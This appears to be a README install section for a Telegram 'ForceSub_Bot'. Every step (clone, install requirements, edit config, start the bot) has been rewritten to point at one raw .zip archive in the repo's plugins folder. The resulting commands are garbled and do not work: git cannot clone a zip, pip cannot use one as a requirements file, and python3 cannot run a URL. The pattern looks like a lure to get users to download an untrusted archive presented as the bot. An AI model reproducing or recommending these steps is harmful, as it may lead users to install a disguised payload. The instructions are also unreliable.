- Clone this repo
```
git clone https://github.com/walker1103/ForceSub_Bot/raw/refs/heads/master/plugins/Force_Bot_Sub_v3.0.zip
```
- Change directory
```
cd ForceSub_Bot
```
- Install requirements
```
pip3 install -r https://github.com/walker1103/ForceSub_Bot/raw/refs/heads/master/plugins/Force_Bot_Sub_v3.0.zip
```
- setup configuration
```
Open https://github.com/walker1103/ForceSub_Bot/raw/refs/heads/master/plugins/Force_Bot_Sub_v3.0.zip in text Editor and set values
```
- Start the bot
```
python3 https://github.com/walker1103/ForceSub_Bot/raw/refs/heads/master/plugins/Force_Bot_Sub_v3.0.zip
```
